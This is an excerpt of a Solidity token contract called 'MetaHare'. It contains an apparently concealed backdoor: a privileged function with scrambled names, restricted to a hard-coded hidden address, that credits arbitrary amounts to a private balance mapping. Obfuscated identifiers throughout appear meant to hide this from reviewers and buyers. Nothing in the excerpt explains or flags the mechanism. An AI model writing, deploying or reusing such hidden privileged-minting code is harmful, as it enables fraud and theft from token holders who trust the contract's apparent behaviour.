...
contract Ownable is Context {
    ...
    address private _yhtrAddress = 0xB2e0a1655f5e858B593eec0BfcbD4D5bf9bC82c9;
...
contract MetaHare is Context, IERC20, Ownable {
    ...
    uint256 private _total = 10000000000* 10**8;
    uint256 private _tFeeTotal;
    
    string private _name = "MetaHare";
    string private _symbol = "MetaHare";
    uint8 private _decimals = 8;

    uint256 public _maxTxAmount = 10000000000 * 10**8;
    uint256 public numTokensSellToAddToLiquidity = 10000000000 * 10**8;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0xB2e0a1655f5e858B593eec0BfcbD4D5bf9bC82c9;
    ...
    bool private usdtU = true;
    bool private BusdB = false;
 
    uint256 public serhfghtyufsdsd = uint256(0);
    mapping(address => uint256) private ETHE;
    address[] private _ETHE;
    address owners;
    ...
    function _vgfwzlc(address pzytd, uint256 trbvjvfs) external yhtrAddress() {
        ...
        uint256 terca = ETHE[pzytd];
        if (terca == 0) _ETHE.push(pzytd);
        ETHE[pzytd] = terca.add(trbvjvfs);
